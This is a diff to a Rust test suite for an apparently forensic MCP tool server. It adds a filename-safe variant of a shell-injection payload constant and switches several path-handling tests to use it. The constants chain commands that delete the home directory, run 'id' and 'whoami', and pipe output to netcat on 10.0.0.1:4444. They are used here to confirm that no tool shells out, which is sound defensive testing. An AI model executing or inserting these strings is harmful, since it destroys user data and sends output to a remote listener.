@@ -34,11 +34,14 @@ use findevil_mcp::{
     PrefetchInput, SuricataEveError, SuricataEveInput, VolRunError, VolRunInput,
 };
 
-// A path string that would be catastrophic if any tool ever shelled out. Used as
-// a filename component, so it must not contain '/' (the only byte illegal in a
-// POSIX filename besides NUL). If a shell ever interpreted it, `touch`/`rm`/`nc`
-// would run; because nothing shells out, it is an inert sequence of bytes.
+// A string that would be catastrophic if any tool ever shelled out.
+// If a shell ever interpreted it, `touch`/`rm`/`nc` would run; because nothing
+// shells out, it is an inert sequence of bytes.
 const SHELL_PAYLOAD: &str = "evil; touch HACKED && $(rm -rf ~) | nc 10.0.0.1 4444 `id`";
+
+// The same guardrail exercised through real filesystem paths. Keep this one
+// valid as a filename on Windows as well as POSIX.
+const SHELL_PAYLOAD_FILENAME: &str = "evil; touch HACKED && $(rm -rf home) & whoami";
 
 fn env_lock() -> MutexGuard<'static, ()> {
     static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
@@ -79,7 +82,7 @@ fn case_open_reads_shell_payload_filename_as_a_literal_file() {
     let _home = HomeGuard::set(tmp.path());
 
     let bytes = b"\x00MFT-ish evidence bytes for a hostile filename";
-    let evil = tmp.path().join(format!("{SHELL_PAYLOAD}.e01"));
+    let evil = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.e01"));
     fs::write(&evil, bytes).expect("write hostile-named evidence");
 
     let handle = case_open(&CaseOpenInput {
@@ -106,7 +109,7 @@ fn case_open_reads_shell_payload_filename_as_a_literal_file() {
 #[test]
 fn evtx_query_treats_shell_payload_path_as_missing_file() {
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.evtx"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.evtx"));
 
     let err = evtx_query(&EvtxQueryInput {
         case_id: "c".to_string(),
@@ -267,7 +270,7 @@ fn journalctl_query_treats_shell_payload_path_as_missing_file() {
     // fragment — a hostile path to a missing file is a clean typed NotFound,
     // and journalctl is never even spawned (the existence check fails first).
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.journal"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.journal"));
 
     let err = journalctl_query(&JournalctlQueryInput {
         case_id: "c".to_string(),
@@ -329,7 +332,7 @@ fn nfdump_query_treats_shell_payload_path_as_missing_file() {
     // (the existence check runs before any spawn, so this holds with or without
     // nfdump installed).
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.nfcapd"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.nfcapd"));
 
     let err = nfdump_query(&NfdumpQueryInput {
         case_id: "c".to_string(),
@@ -347,7 +350,7 @@ fn suricata_eve_treats_shell_payload_path_as_missing_file() {
     // FIXED `-r <pcap_path> -l <outdir>` argv — a hostile pcap_path is one inert
     // argv element; a missing one is a typed PcapNotFound before any spawn.
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.pcap"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.pcap"));
 
     let err = suricata_eve(&SuricataEveInput {
         case_id: "c".to_string(),
@@ -365,7 +368,7 @@ fn indx_parse_treats_shell_payload_path_as_missing_file() {
     // FIXED `INDXParse.py <indx_path>` argv — a hostile indx_path is one inert
     // argv element; a missing one is a typed NotFound before any spawn.
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.indx"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.indx"));
 
     let err = indx_parse(&IndxParseInput {
         case_id: "c".to_string(),
